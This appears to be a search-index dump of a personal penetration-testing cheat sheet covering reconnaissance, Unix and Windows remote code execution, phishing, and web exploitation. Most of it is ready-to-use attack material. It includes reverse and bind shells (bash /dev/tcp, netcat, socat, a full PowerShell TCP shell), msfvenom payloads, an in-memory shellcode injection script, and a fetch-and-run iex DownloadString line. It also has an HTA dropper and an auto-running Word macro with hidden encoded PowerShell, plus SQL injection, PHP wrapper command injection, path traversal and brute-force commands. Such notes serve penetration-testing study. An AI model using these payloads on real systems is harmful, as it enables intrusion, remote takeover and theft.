: you can pass it coordinates hostname : find values that match the hostname net : search based on an IP or /x CIDR os : search based on operating system port : find particular ports that are open before/after : find results within a timeframe Security Header https://securityheaders.com/?q = leecybersec.com & followRedirects = on SSL Labs https://www.ssllabs.com/ssltest/analyze.html?d = leecybersec.com & latest Social Searcher https://www.social-searcher.com/social-buzz/?q5 = leecybersec.com Google Hacking site:leecybersec.com filetype:html site:leecybersec.com -filetype:html intitle: \"index of\" \"backup\" Google Hacking Database Source Code Public About searching on GitHub in :file web user:leecybersec gitleaks -v -r = https://github.com/leecybersec/client-splunk Netcraft Netcraft\u2019s DNS search: https://searchdns.netcraft.com https://searchdns.netcraft.com/?restriction = site+contains & host = .leecybersec.com & position = limited \"site report\": https://sitereport.netcraft.com https://sitereport.netcraft.com/?url = https%3A%2F%2Fleecybersec.com Recon-ng marketplace search site marketplace info recon/domains-hosts/bing_domain_web marketplace install recon/domains-hosts/bing_domain_web modules load recon/domains-hosts/bing_domain_web options set source leecybersec.com Theharvester theHarvester -d leecybersec.com -b google linkedin2username python3 linkedin2username.py -u 'linkedin-username' -n <domain> -c <company-name>","title":"Info Gathering"},{"location":"penetration-testing/external-internal/reconnaissance/infor-gathering.html#information-gathering","text":"","title":"Information Gathering"},{"location":"penetration-testing/external-internal/reconnaissance/infor-gathering.html#osint-framework","text":"","title":"OSINT Framework"},{"location":"penetration-testing/external-internal/reconnaissance/infor-gathering.html#maltego","text":"","title":"Maltego"},{"location":"penetration-testing/external-internal/reconnaissance/infor-gathering.html#shodan","text":"Searching Shodan For Fun And Profit city : find devices in a particular city country : find devices in a particular country geo : you can pass it coordinates hostname : find values that match the hostname net : search based on an IP or /x CIDR os : search based on operating system port : find particular ports that are open before/after : find results within a timeframe","title":"Shodan"},{"location":"penetration-testing/external-internal/reconnaissance/infor-gathering.html#security-header","text":"https://securityheaders.com/?q = leecybersec.com & followRedirects = on","title":"Security Header"},{"location":"penetration-testing/external-internal/reconnaissance/infor-gathering.html#ssl-labs","text":"https://www.ssllabs.com/ssltest/analyze.html?d = leecybersec.com & latest","title":"SSL Labs"},{"location":"penetration-testing/external-internal/reconnaissance/infor-gathering.html#social-searcher","text":"https://www.social-searcher.com/social-buzz/?q5 = leecybersec.com","title":"Social Searcher"},{"location":"penetration-testing/external-internal/reconnaissance/infor-gathering.html#google-hacking","text":"site:leecybersec.com filetype:html site:leecybersec.com -filetype:html intitle: \"index of\" \"backup\" Google Hacking Database","title":"Google Hacking"},{"location":"penetration-testing/external-internal/reconnaissance/infor-gathering.html#source-code-public","text":"About searching on GitHub in :file web user:leecybersec gitleaks -v -r = https://github.com/leecybersec/client-splunk","title":"Source Code Public"},{"location":"penetration-testing/external-internal/reconnaissance/infor-gathering.html#netcraft","text":"Netcraft\u2019s DNS search: https://searchdns.netcraft.com https://searchdns.netcraft.com/?restriction = site+contains & host = .leecybersec.com & position = limited \"site report\": https://sitereport.netcraft.com https://sitereport.netcraft.com/?url = https%3A%2F%2Fleecybersec.com","title":"Netcraft"},{"location":"penetration-testing/external-internal/reconnaissance/infor-gathering.html#recon-ng","text":"marketplace search site marketplace info recon/domains-hosts/bing_domain_web marketplace install recon/domains-hosts/bing_domain_web modules load recon/domains-hosts/bing_domain_web options set source leecybersec.com","title":"Recon-ng"},{"location":"penetration-testing/external-internal/reconnaissance/infor-gathering.html#theharvester","text":"theHarvester -d leecybersec.com -b google","title":"Theharvester"},{"location":"penetration-testing/external-internal/reconnaissance/infor-gathering.html#linkedin2username","text":"python3 linkedin2username.py -u 'linkedin-username' -n <domain> -c <company-name>","title":"linkedin2username"},{"location":"penetration-testing/external-internal/remote-exploitation/Unix%26Linux.html","text":"Unix Remote Code Execution msfvenom Shell File msfvenom -p linux/x86/shell_reverse_tcp LHOST = <IP> LPORT = <PORT> -f elf > shell.elf Java Code msfvenom -p java/jsp_shell_reverse_tcp LHOST = <IP> LPORT = <PORT> -f war > shell.war Shell Code msfvenom -p linux/x86/shell_reverse_tcp LHOST = <ip> LPORT = 443 EXITFUNC = thread -f c \u2013e x86/shikata_ga_nai -b \"<badchars>\" Encoders msfvenom --list encoders Bash Reverse Shell Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash /bin/sh -c 'sh -i >& /dev/tcp/myip/443 0>&1' /bin/sh -c '0<&60-;exec 60<>/dev/tcp/myip/443;sh <&60 >&60 2>&60' Netcat Reverse Shell Kali machine sudo nc -nlvp 443 Unix machine nc -nv 192 .168.11.130 443 -e /bin/sh Netcat OpenBsd rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc myip 443 >/tmp/f Netcat BusyBox rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc myip 443 >/tmp/f Socat Reverse Shell Kali machine socat -d -d TCP4-LISTEN:443 STDOUT Unix machine socat TCP4:192.168.11.130:443 EXEC:/bin/sh Socat Encrypted Bind Shell Create credential openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 999 -out bind_shell.crt cat bind_shell.key bind_shell.crt > bind_shell.pem Unix machine socat OPENSSL-LISTEN:443,cert = bind_shell.pem,verify = 0 ,fork EXEC:/bin/sh Kali machine sudo socat OPENSSL:192.168.11.130:443,verify = 0 Nmap NSE Scripts Exploit cd /usr/share/nmap/scripts grep Exploits *.nse nmap --script-help = clamav-exec.nse Upgrade shell /usr/bin/python -c \"import pty; pty.spawn('/bin/bash')\" export TERM = xterm ^Z stty raw -echo ; fg msfconsole multi handler sudo msfconsole -x \"use exploit/multi/handler; set RHOST ip; set PAYLOAD windows/shell_reverse_tcp; set LHOST tun0; exploit\" processing AutoRunScript 'post/windows/manage/migrate' PayloadsAllTheThings Exploit Resources Online Exploit Database SecurityFocus Packet Storm Reverse Shell Cheatsheet Offline SearchSploit Metasploit Framework BeEF","title":"Unix&Linux"},{"location":"penetration-testing/external-internal/remote-exploitation/Unix%26Linux.html#unix-remote-code-execution","text":"","title":"Unix Remote Code Execution"},{"location":"penetration-testing/external-internal/remote-exploitation/Unix%26Linux.html#msfvenom","text":"Shell File msfvenom -p linux/x86/shell_reverse_tcp LHOST = <IP> LPORT = <PORT> -f elf > shell.elf Java Code msfvenom -p java/jsp_shell_reverse_tcp LHOST = <IP> LPORT = <PORT> -f war > shell.war Shell Code msfvenom -p linux/x86/shell_reverse_tcp LHOST = <ip> LPORT = 443 EXITFUNC = thread -f c \u2013e x86/shikata_ga_nai -b \"<badchars>\" Encoders msfvenom --list encoders","title":"msfvenom"},{"location":"penetration-testing/external-internal/remote-exploitation/Unix%26Linux.html#bash-reverse-shell","text":"Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash /bin/sh -c 'sh -i >& /dev/tcp/myip/443 0>&1' /bin/sh -c '0<&60-;exec 60<>/dev/tcp/myip/443;sh <&60 >&60 2>&60'","title":"Bash Reverse Shell"},{"location":"penetration-testing/external-internal/remote-exploitation/Unix%26Linux.html#netcat-reverse-shell","text":"Kali machine sudo nc -nlvp 443 Unix machine nc -nv 192 .168.11.130 443 -e /bin/sh Netcat OpenBsd rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc myip 443 >/tmp/f Netcat BusyBox rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc myip 443 >/tmp/f","title":"Netcat Reverse Shell"},{"location":"penetration-testing/external-internal/remote-exploitation/Unix%26Linux.html#socat-reverse-shell","text":"Kali machine socat -d -d TCP4-LISTEN:443 STDOUT Unix machine socat TCP4:192.168.11.130:443 EXEC:/bin/sh","title":"Socat Reverse Shell"},{"location":"penetration-testing/external-internal/remote-exploitation/Unix%26Linux.html#socat-encrypted-bind-shell","text":"Create credential openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 999 -out bind_shell.crt cat bind_shell.key bind_shell.crt > bind_shell.pem Unix machine socat OPENSSL-LISTEN:443,cert = bind_shell.pem,verify = 0 ,fork EXEC:/bin/sh Kali machine sudo socat OPENSSL:192.168.11.130:443,verify = 0","title":"Socat Encrypted Bind Shell"},{"location":"penetration-testing/external-internal/remote-exploitation/Unix%26Linux.html#nmap-nse-scripts-exploit","text":"cd /usr/share/nmap/scripts grep Exploits *.nse nmap --script-help = clamav-exec.nse","title":"Nmap NSE Scripts Exploit"},{"location":"penetration-testing/external-internal/remote-exploitation/Unix%26Linux.html#upgrade-shell","text":"/usr/bin/python -c \"import pty; pty.spawn('/bin/bash')\" export TERM = xterm ^Z stty raw -echo ; fg","title":"Upgrade shell"},{"location":"penetration-testing/external-internal/remote-exploitation/Unix%26Linux.html#msfconsole-multi-handler","text":"sudo msfconsole -x \"use exploit/multi/handler; set RHOST ip; set PAYLOAD windows/shell_reverse_tcp; set LHOST tun0; exploit\" processing AutoRunScript 'post/windows/manage/migrate'","title":"msfconsole multi handler"},{"location":"penetration-testing/external-internal/remote-exploitation/Unix%26Linux.html#payloadsallthethings","text":"","title":"PayloadsAllTheThings"},{"location":"penetration-testing/external-internal/remote-exploitation/Unix%26Linux.html#exploit-resources","text":"Online Exploit Database SecurityFocus Packet Storm Reverse Shell Cheatsheet Offline SearchSploit Metasploit Framework BeEF","title":"Exploit Resources"},{"location":"penetration-testing/external-internal/remote-exploitation/windows.html","text":"Windows Remote Code Execution PowerShell Encoded Payload File reverse_shell_cleartext.ps1 $client = New-Object System.Net.Sockets.TCPClient('192.168.11.130',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() Encode payload and copy it to clipboard cat reverse_shell_cleartext.ps1 | iconv -t UTF-16LE | base64 -w 0 | cs Execute payload from clipboard powershell -enc $(vs) Reverse Shell Kali machine sudo nc -nlvp 443 Windows machine powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.11.130',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\" Bind Shell Kali machine nc -nv 192 .168.11.131 443 Windows machine powershell -c \"$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' +(pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()\" Unrestricted and XClipborad Set-ExecutionPolicy Unrestricted Get-ExecutionPolicy Install XClipboard sudo apt install xclip Alias XClipboard command with short character. alias \"cs=xclip -selection clipboard\" alias \"vs=xclip -o -selection clipboard\" In-memory payload injection script $code = ' [DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); [DllImport(\"msvcrt.dll\")] public static extern IntPtr memset(IntPtr dest, uint src, uint count);' ; $winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespace Win32Functions -passthru ; [Byte[]] ; [Byte[]] $sc = < place your shellcode here >; $size = 0x1000 ; if ( $sc . Length -gt 0x1000 ) { $size = $sc . Length }; $x = $winFunc :: VirtualAlloc ( 0 , $size , 0x3000 , 0x40 ); for ( $i = 0 ; $i -le ( $sc . Length - 1 ); $i ++) { $winFunc :: memset ( [IntPtr] ( $x . ToInt32 ()+ $i ), $sc [ $i ], 1 )}; $winFunc :: CreateThread ( 0 , 0 , $x , 0 , 0 , 0 ); for (;;) { Start-sleep 60 }; Powercat Create Environment Windows machine . .\\ powercat . ps1 iex ( New-Object System . Net . Webclient ). DownloadString ( 'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1' ) Kali machine sudo apt install powercat cat /usr/share/windows-resources/powercat/powercat.ps1 Reverse Shell Kali machine sudo nc -nlvp 443 Windows machine powercat -c 192 .168.11.130 -p 443 -e cmd.exe Stand-Alone Payloads Kali machine sudo nc -nlvp 443 Windows machine powercat -c 192 .168.11.130 -p 443 -e cmd.exe -g > shell.ps1 . \\s hell.ps1 Encoded Payloads Kali machine sudo nc -nlvp 443 Windows machine powercat -c 192 .168.11.130 -p 443 -e cmd.exe -ge > encoded_shell.ps1 powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0A...pAAoACgA = Bind Shell Kali machine nc -nv 192 .168.11.131 443 Windows machine powercat -l -p 443 -e cmd.exe Netcat Packed File upx -9 nc.exe Reverse Shell Kali machine sudo nc -nlvp 443 Windows machine nc -nv 192 .168.11.130 443 -e cmd.exe Bind Shell Kali machine nc -nv 192 .168.11.131 443 Windows machine nc -nlvp 443 -e cmd.exe Socat Reverse Shell Kali machine socat -d -d TCP4-LISTEN:443 STDOUT Windows machine socat TCP4:192.168.11.130:443 EXEC:cmd.exe Encrypted Bind Shell Create credential openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 999 -out bind_shell.crt cat bind_shell.key bind_shell.crt > bind_shell.pem Windows machine socat OPENSSL-LISTEN:443,cert = bind_shell.pem,verify = 0 ,fork EXEC:cmd.exe Kali machine sudo socat OPENSSL:192.168.11.130:443,verify = 0 Remote desktop rdesktop $ip -u Tester -p Pass xfreerdp /f /u:Tester /p:<Pass> /v:192.168.0.101 /drive:D,/tmp Build Windows Binary File i686-w64-mingw32-gcc 42341 .c -o syncbreeze_exploit.exe -lws2_32 wine32 syncbreeze_exploit.exe msfconsole multi handler sudo msfconsole -x \"use exploit/multi/handler; set RHOST ip; set PAYLOAD windows/shell_reverse_tcp; set LHOST tun0; exploit\" processing AutoRunScript 'post/windows/manage/migrate' Nmap NSE Scripts Exploit cd /usr/share/nmap/scripts grep Exploits *.nse nmap --script-help = clamav-exec.nse PayloadsAllTheThings Exploit Resources Online Exploit Database SecurityFocus Packet Storm Offline Metasploit Framework BeEF Shell File msfvenom -p windows/shell_reverse_tcp LHOST = <IP> LPORT = <PORT> -f exe > shell.exe Java Code msfvenom -p java/jsp_shell_reverse_tcp LHOST = <IP> LPORT = <PORT> -f war > shell.war Shell Code msfvenom -p windows/shell_reverse_tcp LHOST = <ip> LPORT = 443 EXITFUNC = thread -f c \u2013e x86/shikata_ga_nai -b \"<badchars>\" Encoders msfvenom --list encoders","title":"Windows"},{"location":"penetration-testing/external-internal/remote-exploitation/windows.html#windows-remote-code-execution","text":"","title":"Windows Remote Code Execution"},{"location":"penetration-testing/external-internal/remote-exploitation/windows.html#powershell","text":"Encoded Payload File reverse_shell_cleartext.ps1 $client = New-Object System.Net.Sockets.TCPClient('192.168.11.130',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() Encode payload and copy it to clipboard cat reverse_shell_cleartext.ps1 | iconv -t UTF-16LE | base64 -w 0 | cs Execute payload from clipboard powershell -enc $(vs) Reverse Shell Kali machine sudo nc -nlvp 443 Windows machine powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.11.130',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\" Bind Shell Kali machine nc -nv 192 .168.11.131 443 Windows machine powershell -c \"$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' +(pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()\" Unrestricted and XClipborad Set-ExecutionPolicy Unrestricted Get-ExecutionPolicy Install XClipboard sudo apt install xclip Alias XClipboard command with short character. alias \"cs=xclip -selection clipboard\" alias \"vs=xclip -o -selection clipboard\" In-memory payload injection script $code = ' [DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); [DllImport(\"msvcrt.dll\")] public static extern IntPtr memset(IntPtr dest, uint src, uint count);' ; $winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespace Win32Functions -passthru ; [Byte[]] ; [Byte[]] $sc = < place your shellcode here >; $size = 0x1000 ; if ( $sc . Length -gt 0x1000 ) { $size = $sc . Length }; $x = $winFunc :: VirtualAlloc ( 0 , $size , 0x3000 , 0x40 ); for ( $i = 0 ; $i -le ( $sc . Length - 1 ); $i ++) { $winFunc :: memset ( [IntPtr] ( $x . ToInt32 ()+ $i ), $sc [ $i ], 1 )}; $winFunc :: CreateThread ( 0 , 0 , $x , 0 , 0 , 0 ); for (;;) { Start-sleep 60 };","title":"PowerShell"},{"location":"penetration-testing/external-internal/remote-exploitation/windows.html#powercat","text":"Create Environment Windows machine . .\\ powercat . ps1 iex ( New-Object System . Net . Webclient ). DownloadString ( 'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1' ) Kali machine sudo apt install powercat cat /usr/share/windows-resources/powercat/powercat.ps1 Reverse Shell Kali machine sudo nc -nlvp 443 Windows machine powercat -c 192 .168.11.130 -p 443 -e cmd.exe Stand-Alone Payloads Kali machine sudo nc -nlvp 443 Windows machine powercat -c 192 .168.11.130 -p 443 -e cmd.exe -g > shell.ps1 . \\s hell.ps1 Encoded Payloads Kali machine sudo nc -nlvp 443 Windows machine powercat -c 192 .168.11.130 -p 443 -e cmd.exe -ge > encoded_shell.ps1 powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0A...pAAoACgA = Bind Shell Kali machine nc -nv 192 .168.11.131 443 Windows machine powercat -l -p 443 -e cmd.exe","title":"Powercat"},{"location":"penetration-testing/external-internal/remote-exploitation/windows.html#netcat","text":"Packed File upx -9 nc.exe Reverse Shell Kali machine sudo nc -nlvp 443 Windows machine nc -nv 192 .168.11.130 443 -e cmd.exe Bind Shell Kali machine nc -nv 192 .168.11.131 443 Windows machine nc -nlvp 443 -e cmd.exe","title":"Netcat"},{"location":"penetration-testing/external-internal/remote-exploitation/windows.html#socat","text":"Reverse Shell Kali machine socat -d -d TCP4-LISTEN:443 STDOUT Windows machine socat TCP4:192.168.11.130:443 EXEC:cmd.exe Encrypted Bind Shell Create credential openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 999 -out bind_shell.crt cat bind_shell.key bind_shell.crt > bind_shell.pem Windows machine socat OPENSSL-LISTEN:443,cert = bind_shell.pem,verify = 0 ,fork EXEC:cmd.exe Kali machine sudo socat OPENSSL:192.168.11.130:443,verify = 0","title":"Socat"},{"location":"penetration-testing/external-internal/remote-exploitation/windows.html#remote-desktop","text":"rdesktop $ip -u Tester -p Pass xfreerdp /f /u:Tester /p:<Pass> /v:192.168.0.101 /drive:D,/tmp","title":"Remote desktop"},{"location":"penetration-testing/external-internal/remote-exploitation/windows.html#build-windows-binary-file","text":"i686-w64-mingw32-gcc 42341 .c -o syncbreeze_exploit.exe -lws2_32 wine32 syncbreeze_exploit.exe","title":"Build Windows Binary File"},{"location":"penetration-testing/external-internal/remote-exploitation/windows.html#msfconsole-multi-handler","text":"sudo msfconsole -x \"use exploit/multi/handler; set RHOST ip; set PAYLOAD windows/shell_reverse_tcp; set LHOST tun0; exploit\" processing AutoRunScript 'post/windows/manage/migrate'","title":"msfconsole multi handler"},{"location":"penetration-testing/external-internal/remote-exploitation/windows.html#nmap-nse-scripts-exploit","text":"cd /usr/share/nmap/scripts grep Exploits *.nse nmap --script-help = clamav-exec.nse","title":"Nmap NSE Scripts Exploit"},{"location":"penetration-testing/external-internal/remote-exploitation/windows.html#payloadsallthethings","text":"","title":"PayloadsAllTheThings"},{"location":"penetration-testing/external-internal/remote-exploitation/windows.html#exploit-resources","text":"Online Exploit Database SecurityFocus Packet Storm Offline Metasploit Framework BeEF Shell File msfvenom -p windows/shell_reverse_tcp LHOST = <IP> LPORT = <PORT> -f exe > shell.exe Java Code msfvenom -p java/jsp_shell_reverse_tcp LHOST = <IP> LPORT = <PORT> -f war > shell.war Shell Code msfvenom -p windows/shell_reverse_tcp LHOST = <ip> LPORT = 443 EXITFUNC = thread -f c \u2013e x86/shikata_ga_nai -b \"<badchars>\" Encoders msfvenom --list encoders","title":"Exploit Resources"},{"location":"penetration-testing/mobile-application/index.html","text":"","title":"Moble Application"},{"location":"penetration-testing/social-engineering/index.html","text":"Phishing Some Fish Client Fingerprinting FingerprintJS HTML Applications File: index.hta <html> <body> <script> var c= 'cmd.exe' new ActiveXObject('WScript.Shell').Run(c); </script> </body> </html> File: evil.hta sudo msfvenom -p windows/shell_reverse_tcp LHOST = <ip> LPORT = <port> -f hta-psh -o /var/www/html/evil.hta Microsoft Office Microsoft Word Macro str = \"powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad...\" n = 50 for i in range ( 0 , len ( str ), n ): print \"Str = Str + \" + '\"' + str [ i : i + n ] + '\"' Sub AutoOpen () ReverseShell End Sub Sub Document_Open () ReverseShell End Sub Sub ReverseShell () Dim Str As String Str = Str + \"powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad\" Str = Str + \"ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA\" ... Str = Str + \"yAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnA\" Str = Str + \"G4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFM\" Str = Str + \"AdABhAHIAdAAoACQAcwApADsA\" CreateObject ( \"Wscript.Shell\" ) .Run Str End Sub Object Linking and Embedding ReverseShell.bat START powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad... Web Phishing","title":"Social Engineering"},{"location":"penetration-testing/social-engineering/index.html#phishing-some-fish","text":"","title":"Phishing Some Fish"},{"location":"penetration-testing/social-engineering/index.html#client-fingerprinting","text":"FingerprintJS","title":"Client Fingerprinting"},{"location":"penetration-testing/social-engineering/index.html#html-applications","text":"File: index.hta <html> <body> <script> var c= 'cmd.exe' new ActiveXObject('WScript.Shell').Run(c); </script> </body> </html> File: evil.hta sudo msfvenom -p windows/shell_reverse_tcp LHOST = <ip> LPORT = <port> -f hta-psh -o /var/www/html/evil.hta","title":"HTML Applications"},{"location":"penetration-testing/social-engineering/index.html#microsoft-office","text":"","title":"Microsoft Office"},{"location":"penetration-testing/social-engineering/index.html#microsoft-word-macro","text":"str = \"powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad...\" n = 50 for i in range ( 0 , len ( str ), n ): print \"Str = Str + \" + '\"' + str [ i : i + n ] + '\"' Sub AutoOpen () ReverseShell End Sub Sub Document_Open () ReverseShell End Sub Sub ReverseShell () Dim Str As String Str = Str + \"powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad\" Str = Str + \"ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA\" ... Str = Str + \"yAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnA\" Str = Str + \"G4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFM\" Str = Str + \"AdABhAHIAdAAoACQAcwApADsA\" CreateObject ( \"Wscript.Shell\" ) .Run Str End Sub","title":"Microsoft Word Macro"},{"location":"penetration-testing/social-engineering/index.html#object-linking-and-embedding","text":"ReverseShell.bat START powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad...","title":"Object Linking and Embedding"},{"location":"penetration-testing/social-engineering/index.html#web-phishing","text":"","title":"Web Phishing"},{"location":"penetration-testing/web-application/enumeration.html","text":"Enumeration Enum follow Inspecting URLs Inspecting Page Content Viewing Response Headers Inspecting Sitemaps robots.txt , sitemap.xml Locating Administration Consoles curl http:// $ip curl http:// $ip -s -L | grep \"title\\|href\" | sed -e 's/^[[:space:]]*//' Recon web Check cookies Check the redirection Check SQLi admin' or '1'='1 Check credentials admin and Admin , admin and admin Authentication Check IDOR Check .js, .json Check Object-relational mapping (&admin[admin]=1) Virtual hosting Virtual hosting is a method for hosting multiple domain names (with separate handling of each name) on a single server (or pool of servers). ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http:// $host -H 'Host: FUZZ.$domain' -fw number gobuster vhost -u pit.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt Reference: https://erev0s.com/blog/gobuster-directory-dns-and-virtual-hosts-bruteforcing Web Discovery ffuf ffuf -s -w /usr/share/seclists/Discovery/Web-Content/common.txt -u \" $url : $port /FUZZ\" -e $ext -fw number gobuster gobuster dir -u http:// $ip /cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/ -x txt,sh,php,cgi -s '200,204,403,500' dirb dirb http:// $ip : $port / /usr/share/wordlists/dirb/common.txt -r Nikto nikto -h $ip","title":"Enumeration"},{"location":"penetration-testing/web-application/enumeration.html#enumeration","text":"","title":"Enumeration"},{"location":"penetration-testing/web-application/enumeration.html#enum-follow","text":"Inspecting URLs Inspecting Page Content Viewing Response Headers Inspecting Sitemaps robots.txt , sitemap.xml Locating Administration Consoles curl http:// $ip curl http:// $ip -s -L | grep \"title\\|href\" | sed -e 's/^[[:space:]]*//'","title":"Enum follow"},{"location":"penetration-testing/web-application/enumeration.html#recon-web","text":"Check cookies Check the redirection Check SQLi admin' or '1'='1 Check credentials admin and Admin , admin and admin Authentication Check IDOR Check .js, .json Check Object-relational mapping (&admin[admin]=1)","title":"Recon web"},{"location":"penetration-testing/web-application/enumeration.html#virtual-hosting","text":"Virtual hosting is a method for hosting multiple domain names (with separate handling of each name) on a single server (or pool of servers). ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http:// $host -H 'Host: FUZZ.$domain' -fw number gobuster vhost -u pit.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt Reference: https://erev0s.com/blog/gobuster-directory-dns-and-virtual-hosts-bruteforcing","title":"Virtual hosting"},{"location":"penetration-testing/web-application/enumeration.html#web-discovery","text":"ffuf ffuf -s -w /usr/share/seclists/Discovery/Web-Content/common.txt -u \" $url : $port /FUZZ\" -e $ext -fw number gobuster gobuster dir -u http:// $ip /cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/ -x txt,sh,php,cgi -s '200,204,403,500' dirb dirb http:// $ip : $port / /usr/share/wordlists/dirb/common.txt -r","title":"Web Discovery"},{"location":"penetration-testing/web-application/enumeration.html#nikto","text":"nikto -h $ip","title":"Nikto"},{"location":"penetration-testing/web-application/exploitation.html","text":"Exploitation Credentials Create Passwd Directory for Brute Force cewl -m 5 http:// $ip /joomla/ > passwd.txt Default Credentials ls /usr/share/seclists/Passwords/Default-Credentials Crack hash john hash --wordlist = /home/kali/tools/directory/rockyou.txt Broute force hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192 .168.169.106 --http-post-form '/login:user=^USER^,pass=^PASS^:Unauthorized' Directory Traversal Unix /etc/passwd Windows c:\\windows\\system32\\drivers\\etc\\hosts PHP Wrappers Inject php code via plantext http://ip/file.php?file = data:text/plain,<?php echo shell_exec ( \"dir\" ) ?> Inject php code via base64 http://ip/file.php?file = data: ; base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4 = & x = dir Encode base64 file before read it. http://ip/file.php?file = php://filter/read = convert.base64-encode/resource = /etc/passwd File Inclusion Local File Inclusion Null byte: %00 Write payload to access.log file $ nc -nv 192 .168.11.131 80 ( UNKNOWN ) [ 192 .168.11.131 ] 